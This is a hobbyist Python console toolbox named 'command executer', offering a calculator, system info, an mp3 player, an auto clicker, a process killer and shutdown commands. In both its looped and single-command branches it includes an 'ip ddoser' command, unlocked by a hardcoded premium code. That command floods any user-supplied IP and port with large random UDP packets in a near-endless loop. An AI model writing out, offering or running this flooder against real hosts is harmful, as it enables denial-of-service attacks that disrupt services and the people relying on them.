from multiprocessing.resource_sharer import stop
import string
import time
import psutil
import os

print("░░░░░░░▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄░░░░░░")
print("░░░░░░█░░▄▀▀▀▀▀▀▀▀▀▀▀▀▀▄░░█░░░░░")
print("░░░░░░█░█░▀░░░░░▀░░▀░░░░█░█░░░░░")
print("░░░░░░█░█░░░░░░░░▄▀▀▄░▀░█░█▄▀▀▄░")
print("█▀▀█▄░█░█░░▀░░░░░█░░░▀▄▄█▄▀░░░█░")
print("▀▄▄░▀██░█▄░▀░░░▄▄▀░░░░░░░░░░░░▀▄")
print("░░▀█▄▄█░█░░░░▄░░█░░░▄█░░░▄░▄█░░█")
print("░░░░░▀█░▀▄▀░░░░░█░██░▄░░▄░░▄░███")
print("░░░░░▄█▄░░▀▀▀▀▀▀▀▀▄░░▀▀▀▀▀▀▀░▄▀░")
print("░░░░█░░▄█▀█▀▀█▀▀▀▀▀▀█▀▀█▀█▀▀█░░░")
print("░░░░▀▀▀▀░░▀▀▀░░░░░░░░▀▀▀░░▀▀░░░░")
print("command executer vers 2.0.7 python, creator: ore0Os")
name = input("please enter your name: ")
print(name + " welcome!")
membership_status = input("are you an premium member? yes, no: ")
if membership_status == "yes" or membership_status == "y":
  membership_code = input("enter your membership code: ")
  if membership_code == "2009114":
    access_status = "granted"
    print("a valid code detected.")
    print("special access granted.")
    time.sleep(1) 
  else:
    access_status = "denied"
    print("invalid code.")
if membership_status == "no" or membership_status == "n":
  access_status = "denied"
  time.sleep(0.5)
  print("understood, selecting the standard access.") 
else:
  None
  #dont mind this.
loop = input("do you want to loop the command executer? yes, no: ")
if loop == "yes" or loop == "y":
 while True:
  command = input("> ")
  if command == "calculator" or command == "cal":
    number1 = input("number 1: ")
    number2 = input("number 2: ")
    operator = input("choose a operator * ** / - + : ")
    if operator == "+":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) + int(number2) 
        print(results)
    if operator == "-":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) - int(number2)
        print(results)
    if operator == "*":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) * int(number2)
        print(results)
    if operator == "/":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) / int(number2)
        print(results)
    if operator == "**":
        print("calculating")
        import time 
        time.sleep(1)
        results = int(number1) ** int(number2)
        print(results)
    if command == "looped calculator" or command == "lcal":
     while True:
      number1 = input("number 1: ")
      number2 = input("number 2: ")
      operator = input("choose a operator * ** / - + : ")
      if operator == "+":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) + int(number2)
        print(results)
      if operator == "-":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) - int(number2)
        print(results)
      if operator == "*":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) * int(number2)
        print(results)
      if operator == "/":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) / int(number2)
        print(results)
      if operator == "**":
        print("calculating")
        import time 
        time.sleep(1)
        results = int(number1) ** int(number2) 
        print(results)        
  if command == "spam":
    spamming_profile = input("type a certain word or number to spam: ")
    print("starting...")
    import time
    time.sleep(1.25)
    while True:
        print(spamming_profile)
  if command == "ip ddoser" or command == "ddos":
    if access_status == "granted":
     print("activating the ip ddoser...")
     time.sleep(3)
     print("procceded.")
     import socket, random, time
     profile = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     targetip = (input("write the target ip: "))
     targetport = int(input("write the target port: "))
     profile.connect((targetip, targetport))
     for i in range(1, 100**1000):
      profile.send(random._urandom(10)*1000)
      print(f"send: {i}", end='\r') 
    else:
      print("you cannot use this command with the standard access.")
  if command == "disk storage" or command == "disk" or command == "ds":
    import shutil
    def get_disk_usage():
        try:
            total, used, free = shutil.disk_usage('/')
            return total, used, free
        except Exception as e:
            print("Unable to retrieve disk usage information.")
            print(e)
            return None
    def print_disk_information():
        disk_usage = get_disk_usage()
        if disk_usage is not None:
           total_size, used_size, free_size = disk_usage
           print(f"Total disk size: {total_size // (2**30)} GB")
           print(f"Used disk space: {used_size // (2**30)} GB")
           print(f"Free disk space: {free_size // (2**30)} GB")
        else:
           print("Unable to retrieve disk information.")
    print_disk_information()
  if command == "memory space" or command == "memory" or command == "ms":
    import psutil
    def get_memory_usage():
       try:
           memory = psutil.virtual_memory()
           return memory
       except Exception as e:
           print("Unable to retrieve memory usage information.")
           print(e)
           return None
    def print_memory_information():
        memory_usage = get_memory_usage()
        if memory_usage is not None:
           total_memory = memory_usage.total
           used_memory = memory_usage.used
           free_memory = memory_usage.available
           print(f"Total memory: {total_memory // (2**30)} GB")
           print(f"Used memory: {used_memory // (2**30)} GB")
           print(f"Free memory: {free_memory // (2**30)} GB")
        else:
           print("Unable to retrieve memory information.")
    print_memory_information()
  if command == "mp3 player" or command == "mp3":
     import os
     import pygame
     import time
     import keyboard
     def play_mp3(file_name, loop=False):
         pygame.mixer.music.load(file_name)
         pygame.mixer.music.play(loops=-1 if loop else 0)
     folder_path = input("Enter the folder path containing the MP3 files: ")
     loop_option = input("Loop the MP3 files? (y/n): ").lower() == "y"
     time.sleep(0.5)
     print("'z' to pause and 'e' to skip and 'a' to go to the prev mp3 file and 'r' to stop the whole script")
     mp3_files = [file for file in os.listdir(folder_path) if file.endswith(".mp3")]
     current_index = 0 
     is_playing = True 
     pygame.init()
     pygame.mixer.init()
     play_mp3(os.path.join(folder_path, mp3_files[current_index]), loop_option)
     while True:
         if is_playing:
             if keyboard.is_pressed('z'):
                 pygame.mixer.music.pause()
                 is_playing = False
             elif keyboard.is_pressed('a'):
                 current_index = (current_index - 1) % len(mp3_files)
                 play_mp3(os.path.join(folder_path, mp3_files[current_index]), loop_option)
             elif keyboard.is_pressed('e'):
                 current_index = (current_index + 1) % len(mp3_files)
                 play_mp3(os.path.join(folder_path, mp3_files[current_index]), loop_option)
             elif keyboard.is_pressed('r'):
                 break
         else:
             if keyboard.is_pressed('z'):
                 pygame.mixer.music.unpause()
                 is_playing = True
             elif keyboard.is_pressed('r'):
                 break
  if command == "end process" or command == "kill process" or command == "kpr":
    import psutil
    process_name = input("proccess: ")
    def end_process_by_name(process_name):
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.name() == process_name:
                proc.kill()
                print(f"Process {process_name} has been terminated.")
                return True
        print(f"No process with the name {process_name} was found.")
        return False
    end_process_by_name(process_name)
  if command == "quran":
     None
     #im still cooking
  if command == "auto clicker" or command == "ac":
   import pyautogui
   import keyboard
   import time
   delay_speed = float(input("Select the delay speed (in seconds): "))
   click_type = input("Select click type (single or double 'press f6 to stop'): ")
   print("The action has been started.")
   def auto_click(delay, click):
       while True:
           if keyboard.is_pressed('f6'):
              print("The action has been stopped.")
              break
           x, y = pyautogui.position()
           if click == 'single':
                pyautogui.click(x, y) 
           elif click == 'double':
                  pyautogui.doubleClick(x, y)      
           time.sleep(delay)
   auto_click(delay_speed, click_type)
  if command == "ai" or command == "aiservice" or command == "artfical intelegent":
    print("under devolopment.")
  if command == "time" or command == "time date" or command == "time and date" or command == "date and time" or command == "date time" or command == "date":
    from datetime import datetime
    import time
    yearmonthday = datetime.now()
    dt_string = yearmonthday.strftime("%d/%m/%Y %H:%M:%S")
    print("date and time =", dt_string)       
  if command == "random password" or command == "rp":
    import random
    import string
    def generate_password(length):
        chars = string.ascii_letters + string.digits
        password = ''.join(random.choice(chars) for i in range(length))  
        return password
    password = generate_password(15)
    print("Random Password:", password)
  if command == "shutdown" or command == "shut down" or command == "system shut" or command == "sys shut":
    import os
    import time
    print("shutting down...")
    time.sleep(2)
    os.system("shutdown /s /t 1")
  if command == "restart" or command == "system restart" or command == "sys restart":
    import os
    import time 
    print("restarting...")
    time.sleep(2)
    os.system("shutdown /r /t 1") 
  if command == "change my name" or command == "set name" or command == "cmn":
    name = input("enter your new name: ")
    if name == "2009114":
      print("name has been set.")
      print("special functions has been opened.")
    else:
      print("name has been set.")
  if command == "print my name" or command == "my name" or command == "pmn":
    print(name)
  if command == "list" or command == "commands list" or command == "commands":
    print("those are the following added commands: ")
    print("calculator, looped calculator, auto click, spam, random password, disk, memory, mp3 player, change my name, print my name, pc proccess, end process, time, shutdown, restart, close.")
  if command == "stop" or command == "close" or command == "exit" or command == "quit":
    print("exiting...")
    import time
    time.sleep(0.5)
    exit()
  else:
    print("enter a valid command!")
else:
  print("an error occurred...")
if loop == "no" or loop == "n":
  command = input("> ")
  if command == "calculator" or command == "cal":
    number1 = input("number 1: ")
    number2 = input("number 2: ")
    operator = input("choose a operator * ** / - + : ")
    if operator == "+":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) + int(number2)
        print(results)
    if operator == "-":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) - int(number2)
        print(results)
    if operator == "*":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) * int(number2)
        print(results)
    if operator == "/":
        print("calculating")
        import time
        time.sleep(1)
        results = int(number1) / int(number2)
        print(results)
    if operator == "**":
        print("calculating")
        import time 
        time.sleep(1)
        results = int(number1) ** int(number2) 
        print(results)  
  if command == "spam":
    spamming_profile = input("type a certain word or number to spam: ")
    print("starting...")
    import time
    time.sleep(1.5)
    while True:
        print(spamming_profile)
  if command == "ip ddoser" or command == "ddos":
    if access_status == "granted":
     print("activating the ip ddoser...")
     time.sleep(3)
     print("procceded.")
     import socket, random, time
     profile = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     targetip = (input("write the target ip: "))
     targetport = int(input("write the target port: "))
     profile.connect((targetip, targetport))
     for i in range(1, 100**1000):
      profile.send(random._urandom(10)*1000)
      print(f"send: {i}", end='\r')  
    else:
      print("you cannot use this command with the standard access.")
  if command == "disk storage" or command == "disk" or command == "ds":
    import shutil
    def get_disk_usage():
        try:
            total, used, free = shutil.disk_usage('/')
            return total, used, free
        except Exception as e:
            print("Unable to retrieve disk usage information.")
            print(e)
            return None
    def print_disk_information():
        disk_usage = get_disk_usage()
        if disk_usage is not None:
           total_size, used_size, free_size = disk_usage
           print(f"Total disk size: {total_size // (2**30)} GB")
           print(f"Used disk space: {used_size // (2**30)} GB")
           print(f"Free disk space: {free_size // (2**30)} GB")
        else:
           print("Unable to retrieve disk information.")
    print_disk_information()
  if command == "memory space" or command == "memory" or command == "ms":
    import psutil
    def get_memory_usage():
       try:
           memory = psutil.virtual_memory()
           return memory
       except Exception as e:
           print("Unable to retrieve memory usage information.")
           print(e)
           return None
    def print_memory_information():
        memory_usage = get_memory_usage()
        if memory_usage is not None:
           total_memory = memory_usage.total
           used_memory = memory_usage.used
           free_memory = memory_usage.available
           print(f"Total memory: {total_memory // (2**30)} GB")
           print(f"Used memory: {used_memory // (2**30)} GB")
           print(f"Free memory: {free_memory // (2**30)} GB")
        else:
           print("Unable to retrieve memory information.")
    print_memory_information()   
  if command == "mp3 player" or command == "mp3":
     import os
     import pygame
     import time
     def play_mp3(file_name, loop=False):
         pygame.mixer.init()
         pygame.mixer.music.load(file_name)
         pygame.mixer.music.play(loops=-1 if loop else 0)
         while pygame.mixer.music.get_busy():
             pygame.event.poll()
             time.sleep(0.1)
     pygame.display.init()
     pygame.display.set_mode((200, 200), pygame.HIDDEN)
     folder_path = input("Enter the folder path containing the MP3 files: ")
     loop_option = input("Loop the MP3 files? (y/n): ").lower() == "y"
     mp3_files = [file for file in os.listdir(folder_path) if file.endswith(".mp3")]
     for file_name in mp3_files:
         full_path = os.path.join(folder_path, file_name)
         play_mp3(full_path, loop_option)  
  if command == "pc process" or command == "process" or command == "proc":
    import wmi
    f = wmi.WMI()
    print("ProcessId  /  Process name")
    for process in f.Win32_Process():
     print(f"{process.ProcessId:<10} {process.Name}")
  if command == "end process" or command == "kill process" or command == "kpr":
    import psutil
    process_name = input("proccess: ")
    def end_process_by_name(process_name):
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.name() == process_name:
                proc.kill()
                print(f"Process {process_name} has been terminated.")
                return True
        print(f"No process with the name {process_name} was found.")
        return False
    end_process_by_name(process_name)
  if command == "auto clicker" or command == "ac":
   import pyautogui
   import keyboard
   import time
   delay_speed = float(input("Select the delay speed (in seconds): "))
   click_type = input("Select click type (single or double 'press f6 to stop'): ")
   print("The action has been started.")
   def auto_click(delay, click):
       while True:
           if keyboard.is_pressed('f6'):
              print("The action has been stopped.")
              break
           x, y = pyautogui.position()
           if click == 'single':
                pyautogui.click(x, y)
           elif click == 'double':
                  pyautogui.doubleClick(x, y)
           time.sleep(delay)
   auto_click(delay_speed, click_type)  
  if command == "ai" or command == "aiservice" or command == "artfical intelegent":
    print("under devolopment.")  
  if command == "time" or command == "time date" or command == "time and date" or command == "date and time" or command == "date time" or command == "date":
    from datetime import datetime
    import time
    yearmonthday = datetime.now()
    dt_string = yearmonthday.strftime("%d/%m/%Y %H:%M:%S")
    print("date and time =", dt_string)
  if command == "random password" or command == "rp":
    import random
    import string
    def generate_password(length):
        chars = string.ascii_letters + string.digits
        password = ''.join(random.choice(chars) for i in range(length))  
        return password
    password = generate_password(15)
    print("Random Password:", password)
  if command == "shutdown" or command == "shut down" or command == "system shut" or command == "sys shut":
    import os
    import time
    print("shutting down...")
    time.sleep(2)
    os.system("shutdown /s /t 1")
  if command == "restart" or command == "system restart" or command == "sys restart":
    import os
    import time 
    print("restarting...")
    time.sleep(2)
    os.system("shutdown /r /t 1")   
  if command == "list" or command == "commands list" or command == "commands":
    print("those are the following added commands: ")
    print("calculator, auto clicker, spam, random password, disk, memory, mp3 player, pc proccess, end process, time, shutdown, close.")
print("exiting...")
import time
time.sleep(1.8)
